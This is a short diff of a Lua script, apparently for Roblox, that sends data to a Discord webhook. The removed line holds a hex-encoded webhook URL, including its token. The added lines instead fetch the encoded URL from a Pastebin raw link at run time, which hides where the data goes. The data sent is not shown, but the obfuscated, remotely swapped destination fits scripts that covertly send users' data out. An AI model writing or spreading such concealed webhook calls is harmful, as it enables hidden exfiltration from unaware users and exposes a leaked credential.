@@ -132,9 +132,12 @@ local function sendWebhook(encodedUrl, data)
     request(abcdef)
 end
 
--- Encoded Webhook URL (you need to encode your webhook URL)
-local encodedWebhookUrl = "68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313239303533393631373338383436363233372f49675445734f6a6449506f754c357a49493347635a6a565f416f6d7773515638334e3537324935677655796e79306f3859476159424b6e465973533771454e7a69496b52"
+-- Get encoded Webhook URL from Pastebin
+local function getEncodedWebhookUrl()
+    return game:HttpGet("https://pastebin.com/raw/GEjXBV9y")
+end
 
+local encodedWebhookUrl = getEncodedWebhookUrl()
 local webhookData = createWebhookData()
 
 -- Sending the webhook
